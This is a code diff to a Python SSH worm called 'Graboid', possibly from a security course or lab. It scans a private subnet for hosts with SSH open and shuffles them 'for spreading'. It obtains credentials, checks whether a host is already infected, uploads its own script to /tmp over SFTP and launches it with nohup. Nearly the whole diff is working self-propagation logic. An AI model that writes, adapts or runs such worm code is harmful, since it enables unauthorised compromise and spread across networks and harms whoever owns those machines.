@@ -27,6 +27,7 @@ import nmap
 # import netinfo
 import os
 import netifaces
+import random
 
 
 
@@ -50,10 +51,14 @@ comp_Msg = "There be a Graboid in these parts"
 #Returns list of IP address on the listed network
 def scanner():
   portScanner = nmap.PortScanner()
-  # portScanner.scan("192.168.56.1/24", arguments = "-p 22 --open")
+  portScanner.scan("192.168.56.1/24", arguments = "-p 22 --open")
 
-  portScanner.scan("172.31.19.1/24")#, arguments = "-p 22 --open")
+  # portScanner.scan("172.31.19.1/24", arguments = "-p 22 --open")
 
+  # hosts = [portScanner.all_hosts()]
+  # target = hosts[0]
+
+  # return target
   return portScanner.all_hosts()
 
 #isInfectedSystem
@@ -77,9 +82,10 @@ def tunnelexe(sshTGT, sftpTGT):
     try:
         sftpTGT.put(TGT_file("Graboid.py" ), "/tmp/" + "Graboid.py")
         
-        sshTGT.exec_command("sudo apt -y install python3-pip")
-        sshTGT.exec_command("sudo apt-get -y install python-paramiko")
-        sshTGT.exec_command("sudo apt-get -y install python-netifaces")
+        # sshTGT.exec_command("sudo apt -y install python3-pip")
+        # sshTGT.exec_command("sudo apt-get -y install python-paramiko")
+        # sshTGT.exec_command("sudo apt-get -y install python-netifaces")
+        # sshTGT.exec_command("sudo apt-get -y install nmap")
         sshTGT.exec_command("chmod a+x /tmp/Graboid.py" )
         sshTGT.exec_command("nohup python /tmp/Graboid.py")
         
@@ -161,31 +167,34 @@ def main():
     ip_addr = thisIP(interface)
 
     networkHosts = scanner()
-    # print(networkHosts)
+    print(networkHosts)
 
-    # networkHosts.remove(ip_addr)
+    # networkHosts.remove()
+    
+    #suffle hosts for spreading
+    random.shuffle(networkHosts)
 
   print("Found hosts: ", networkHosts)
 
-  for host in networkHosts:
-    sshinfo = GraboidATTACK(host)
-    print(sshinfo)
+  # for host in networkHosts:
+  sshinfo = GraboidATTACK(networkHosts[0])
+  print(sshinfo)
 
-    if sshinfo:
-      print("Creds Found! Connecting!!")
-      sftpTGT = sshinfo[0].open_sftp()
-      
-      if not ifInfected(sftpTGT):
-        try:
-          print("Graboiding?")
-          tunnelexe(sshinfo[0],sftpTGT)
-        except:
-          graboid_error = sys.exc_info()[0]
-          print(graboid_error)
-      else:
-        print("Graboid was already here!")
-      
-      sftpTGT.close()
+  if sshinfo:
+    print("Creds Found! Connecting!!")
+    sftpTGT = sshinfo[0].open_sftp()
+    
+    if not ifInfected(sftpTGT):
+      try:
+        print("Graboiding?")
+        tunnelexe(sshinfo[0],sftpTGT)
+      except:
+        graboid_error = sys.exc_info()[0]
+        print(graboid_error)
+    else:
+      print("Graboid was already here!")
+    
+    sftpTGT.close()
 
 
 ### DUNDER CHECK ###
